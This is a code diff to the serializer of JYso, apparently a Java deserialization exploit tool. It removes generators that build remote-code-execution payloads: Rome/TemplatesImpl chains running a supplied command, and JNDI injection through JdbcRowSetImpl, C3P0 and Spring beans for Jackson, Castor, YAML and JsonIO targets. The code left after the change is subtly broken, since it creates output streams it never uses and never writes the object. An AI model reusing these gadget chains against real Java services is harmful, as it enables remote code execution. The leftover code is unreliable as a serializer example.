@@ -7,9 +7,6 @@ import com.esotericsoftware.kryo.Kryo;
 import com.esotericsoftware.kryo.io.Output;
 import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
 import com.qi4l.JYso.gadgets.C3P0WrapperConnPool;
-import com.qi4l.JYso.gadgets.SpringUtil;
-import com.qi4l.JYso.gadgets.TemplatesUtil;
-import com.qi4l.JYso.gadgets.UtilFactory;
 import com.qi4l.JYso.gadgets.utils.utf8OverlongEncoding.UTF8OverlongObjectOutputStream;
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
@@ -58,226 +55,29 @@ public class Serializer implements Callable<byte[]> {
 
     public static void qiserialize(
             Object obj,
-            final OutputStream out,
-            String payloadType,
-            String Command
+            final OutputStream out
     ) throws Exception {
-        ObjectOutputStream objOut = null;
-        AbstractHessianOutput AobjOut = null;
         ByteArrayOutputStream outB64 = new ByteArrayOutputStream();
 
         if (IS_DIRTY_IN_TC_RESET) {
-            objOut = new SuObjectOutputStream(out);
+            new SuObjectOutputStream(out);
         } else if (IS_UTF_Bypass) {
             if (BASE64) {
-                objOut = new UTF8OverlongObjectOutputStream(outB64);
+                new UTF8OverlongObjectOutputStream(outB64);
             } else {
-                objOut = new UTF8OverlongObjectOutputStream(out);
+                new UTF8OverlongObjectOutputStream(out);
             }
-        } else if (IS_Hessian1) {
-            if (BASE64) {
-                AobjOut = new HessianOutput(outB64);
-            } else {
-                AobjOut = new HessianOutput(out);
-            }
-            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
-            sf.setAllowNonSerializable(true);
-            AobjOut.setSerializerFactory(sf);
-        } else if (IS_Hessian2) {
-            if (BASE64) {
-                AobjOut = new Hessian2Output(outB64);
-            } else {
-                AobjOut = new Hessian2Output(out);
-            }
-            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
-            sf.setAllowNonSerializable(true);
-            AobjOut.setSerializerFactory(sf);
-            AobjOut.writeObject(obj);
-            AobjOut.close();
-        } else if (IS_Xstream) {
-            XStream xstream = new XStream();
-            String xml = xstream.toXML(obj);
-            System.out.println(xml);
-            return;
-        } else if (IS_Kryo) {
-            Kryo kryo = new Kryo();
-            ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            try (Output output = new Output(bos)) {
-                kryo.writeClassAndObject(output, obj);
-            }
-            if (BASE64) {
-                String base64String = Base64.getEncoder().encodeToString(bos.toByteArray());
-                System.out.println(base64String);
-            } else {
-                System.out.println(bos);
-            }
-            return;
-        } else if (IS_JsonIO) {
-            if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
-                UtilFactory uf = new UtilFactory();
-                obj = SpringUtil.makeBeanFactoryTriggerBFPA(uf, "caller", SpringUtil.makeMethodTrigger(new ProcessBuilder(Command), "start"));
-                System.out.println(obj);
-                return;
-            } else if (payloadType.equals("Rome")) {
-                obj = makeRome(Command);
-                System.out.println(obj);
-                return;
-            }
-            String jsonio = JsonWriter.objectToJson(obj);
-            System.out.println(jsonio);
-            return;
-        } else if (IS_YamlBeans) {
-            obj = YamlBeansHandler(payloadType, Command);
-            System.out.println(obj);
-            return;
-        } else if (IS_JYAML) {
-            String payload = JYamlHandler(payloadType, Command);
-            System.out.println(payload);
-            return;
-        } else if (IS_Castor) {
-            obj = CastorHandler(payloadType, Command);
-            System.out.println(obj);
-            return;
-        } else if (IS_Jackson) {
-            obj = JacksonHandler(payloadType, Command);
-            System.out.println(obj);
-            return;
         } else {
             if (BASE64) {
-                objOut = new SuObjectOutputStream(outB64);
+                new SuObjectOutputStream(outB64);
             } else {
-                objOut = new SuObjectOutputStream(out);
-            }
-        }
-
-        if (IS_Hessian1 || IS_Hessian2) {
-            if (AobjOut != null) {
-                AobjOut.writeObject(obj);
-            }
-        } else {
-            if (objOut != null) {
-                objOut.writeObject(obj);
+                new SuObjectOutputStream(out);
             }
         }
 
         if (BASE64) {
             String encodedString = Base64.getEncoder().encodeToString(outB64.toByteArray());
             System.out.println(encodedString);
-        }
-    }
-
-    public static Object makeRome(String Command) throws Exception {
-        UtilFactory uf = new UtilFactory();
-        String[] args = {Command};
-        Object tpl = TemplatesUtil.createTemplatesImpl(args);
-        Object obj1 = makeROMEAllPropertyTrigger(uf, Templates.class, (Templates) tpl);
-        String marshalled = JsonWriter.objectToJson(obj1);
-        // add the transient _tfactory field
-        marshalled = marshalled.replace(
-                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",",
-                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_tfactory\""
-                        + ": {\"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},");
-        return marshalled;
-    }
-
-    public static <T> Object makeROMEAllPropertyTrigger(UtilFactory uf, Class<T> type, T obj) throws Exception {
-        ToStringBean item = new ToStringBean(type, obj);
-        EqualsBean root = new EqualsBean(ToStringBean.class, item);
-        return uf.makeHashCodeTrigger(root);
-    }
-
-    public static Object YamlBeansHandler(String payloadType, String command) throws IOException, URISyntaxException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
-        globalinline = true;
-        if (payloadType.equals("C3P0WrapperConnPool")) {
-            URI uri = new URI(command);
-            String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-            return writeObject(
-                    WrapperConnectionPoolDataSource.class,
-                    Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
-        } else {
-            return null;
-        }
-    }
-
-    public static Object JacksonHandler(String payloadType, String jndiUrl) throws Exception {
-        switch (payloadType) {
-            case "SpringAbstractBeanFactoryPointcutAdvisor": {
-                Map<String, String> values = new LinkedHashMap<>();
-                values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
-                values.put("adviceBeanName", quoteString(jndiUrl));
-                return writeCollection(
-                        HashSet.class.getName(),
-                        writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, values),
-                        writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, Collections.EMPTY_MAP));
-            }
-            case "C3P0WrapperConnPool":
-                URI uri = new URI(jndiUrl);
-                String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-                return writeJackJsonObject(
-                        WrapperConnectionPoolDataSource.class,
-                        Collections.singletonMap("userOverridesAsString", quoteString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
-            case "SpringPropertyPathFactory": {
-                Map<String, String> values = new LinkedHashMap<>();
-                values.put("targetBeanName", quoteString(jndiUrl));
-                values.put("propertyPath", quoteString("foo"));
-                values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
-                return writeJackJsonObject(PropertyPathFactoryBean.class, values);
-            }
-            case "JdbcRowSet": {
-                Map<String, String> values = new LinkedHashMap<>();
-                values.put("dataSourceName", quoteString(jndiUrl));
-                values.put("autoCommit", "true");
-                return writeJackJsonObject(JdbcRowSetImpl.class, values);
-            }
-            case "C3P0RefDataSource": {
-                Map<String, String> values = new LinkedHashMap<>();
-                values.put("jndiName", quoteString(jndiUrl));
-                values.put("loginTimeout", "0");
-                return writeJackJsonObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", values);
-            }
-            default:
-                return null;
-        }
-    }
-
-    public static String JYamlHandler(String payloadType, String command) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
-        switch (payloadType) {
-            case "JdbcRowSet":
-                Map<String, String> properties = new LinkedHashMap<>();
-                properties.put("dataSourceName", writeString(command));
-                properties.put("autoCommit", "true");
-                return writeObject(JdbcRowSetImpl.class, properties);
-            case "C3P0WrapperConnPool":
-                URI uri = new URI(command);
-                String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-                return writeObject(
-                        WrapperConnectionPoolDataSource.class,
-                        Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
-            case "C3P0RefDataSource":
-                Map<String, String> props = new LinkedHashMap<>();
-                props.put("jndiName", writeString(command));
-                props.put("loginTimeout", "0");
-                return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
-            default:
-                return null;
-        }
-    }
-
-    public static Object CastorHandler(String payloadType, String jndiName) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
-        if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
-            return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
-                    + "xmlns:java=\"http://java.sun.com\" xsi:type=\"java:org.springframework.beans.factory.config.PropertyPathFactoryBean\">"
-                    + "<target-bean-name>" + jndiName + "</target-bean-name><property-path>foo</property-path>"
-                    + "<bean-factory xsi:type=\"java:org.springframework.jndi.support.SimpleJndiBeanFactory\">" + "<shareable-resource>" + jndiName
-                    + "</shareable-resource></bean-factory></x>";
-        } else if (payloadType.equals("C3P0WrapperConnPool")) {
-            URI uri = new URI(jndiName);
-            String[] args = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
-            return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
-                    + "xmlns:java=\"http://java.sun.com\" xsi:type=\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" "
-                    + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]) + "\"/>";
-        } else {
-            return null;
         }
     }
 
